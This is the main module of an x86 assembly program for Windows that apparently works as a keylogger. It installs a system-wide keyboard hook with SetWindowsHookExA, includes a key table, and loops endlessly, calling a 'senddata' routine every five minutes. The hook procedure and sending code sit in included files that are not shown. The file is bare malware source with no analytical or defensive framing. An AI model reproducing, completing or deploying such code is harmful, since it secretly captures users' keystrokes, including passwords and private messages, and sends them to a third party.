.386
.MODEL FLAT,STDCALL
locals
jumps

UNICODE=0

include hook.asm
include c:\usr\lib\w32.inc

.DATA

include keytable.asm
include const.asm
include vars.asm


.CODE

main:
        call    GetModuleHandle, NULL
        mov     _hinst, eax

        call    CreateFile, offset _sysfname, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
        mov     _hFile, eax
        call    WriteFile, _hFile, offset _hInst, 4, offset _temp, 0
        call    CloseHandle, _hFile

        call    init

        call    SetWindowsHookExA, 2, offset hookproc, 0, 0
        mov     _hHook, eax

;        push    0
;        push    offset msg_title
;        push    offset msg_exit
;        push    0
;        call    MessageBox

;        push    _hHook
;        call    UnhookWindowsHookEx

;        call    WinExec, offset _explorer, 2

@_unterminated:

        call    delay, 300000  ; 5 perc
        call    senddata

        jmp     @_unterminated

        call    ExitProcess

include hp.asm ;hookproc
include init.asm
include send.asm
include int2str.asm

ends
end main